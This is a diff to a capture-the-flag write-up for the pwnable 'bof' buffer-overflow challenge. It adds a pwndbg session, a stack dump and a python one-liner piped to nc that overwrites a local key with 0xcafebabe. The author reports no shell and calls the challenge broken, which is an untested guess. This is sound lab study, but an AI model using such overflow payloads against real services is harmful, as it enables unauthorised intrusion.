@@ -79,24 +79,67 @@ bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read
 ## Vulnerability
 The binary has a buffer overflow vulnerabilty because the gets() function performs no check on the size of the input. It will keep on accepting input until a newline is encountered irrespective of the size of the variable in which the input is being stored. This property is described as a lack of ‘bounds checking’.
 
+Because canaries are used, the stack is protected against overflow-attacks: 
+
+```shell
+bof@ubuntu:~$ ./bof
+overflow me : 1234567890123456789012345678901234
+Nah..
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+```
+
 ## Summary of recon
 - A binary with a buffer overflow vunerabilty
 - The binary has stack protection enabled (canary)
 
 # Solution/Exploit
 ## Task
-To get the shell, we must overwrite the function local variable with the value `0xcafebabe`. This can be done with a payload that gets read by the gets() function and will overflow the `overflowne` buffer. However, we have to also takecare of the stack canary values. 
+To get the shell, we must overwrite the function local variable with the value `0xcafebabe`. This can be done with a payload that gets read by the gets() function and will overflow the `overflowme` buffer. However, we can possibly ignore the stack protection (canary), because we get shell BEFORE the function returns control to main (where stack manipulation will be detected.)
 
 ## Strategy
 
-1. Because there is no debugger on the target system, we will compile the source code locally to be able to test the payload with the proper compile flags. We wil use the `pwn` docker container [1](#1)
-2. Create `exploit.py` that interacts with the bynary and sends the payload using pwntools
-3. Test the exploit
+1. Use the debugger on the target system to calculate the offset needed to overwrite the function parameter
 
-## Compile the source
-We will 
+```shell
+gdb
+pwndbg> file bof
+pwndbg> start
+```
+
+Use next, step and disassemble to find the position, where gets() returns, just before the parameter gets compared to the constant value of `0xcafebabe`. Then hit c (contiune) - we enter the string `AAAABBBBCCCCDDDDEEEEFFFF` on the stack, we can see that the value of the parameter is on the stack 7 * 4 bytes after the end of the overflowme buffer:
+
+```text
+pwndbg> x/40wx $sp
+0xffffd4f0:	0xf7ffd608	0x00000020	0x00000000	0x41414141
+0xffffd500:	0x42424242	0x43434343	0x44444444	0x45454545
+0xffffd510:	0x46464646	0x00000000	0xf7d954be	0x8899f900
+0xffffd520:	0xf7fa7000	0xffffd614	0xffffd548	0x565562c5
+0xffffd530:	>0xdeadbeef<	0xf7fbe66c	0xf7fbeb30	0x565562b3
+0xffffd540:	0x00000001	0xffffd560	0xf7ffd020	0xf7d9e519
+0xffffd550:	0xffffd753	0x00000070	0xf7ffd000	0xf7d9e519
+0xffffd560:	0x00000001	0xffffd614	0xffffd61c	0xffffd580
+0xffffd570:	0xf7fa7000	0x5655629d	0x00000001	0xffffd614
+0xffffd580:	0xf7fa7000	0xffffd614	0xf7ffcb80	0xf7ffd020
+```
+
+We can calculate the distance between our input and 0xdeadbeef easily, each hex value represents 4 bytes (0x41414141 == AAAA) and we have exactly 13 of them before 0xdeadbeef.
+
+We can create the payload using a simple python script and pass it to nc: 
+
+```shell
+python3 -c "import sys; sys.stdout.buffer.write(b''.join([b'A' * 52]) + b'\xbe\xba\xfe\xca' + b'\n')" | nc 0 9000 
+````
+
+But there is no shell. However, when we alter the value of that should overwrite the parameter `key`we get a `stack smashed` warning: 
+
+```shell
+bof@ubuntu:~$ python3 -c "import sys; sys.stdout.buffer.write(b''.join([b'A' * 52]) + b'\xbe\xba\xfe\xce' + b'\n')" | nc 0 9000
+*** stack smashing detected ***: terminated
+```
 
 # Conclusion
+- The challenge seems to be broken. 
+
 # References
-1. <a name="1"></a> [pwn](/tools/pwn) Docker image to run the binary locally 
-2. <a name="2"></a> [pwntools]() 
+
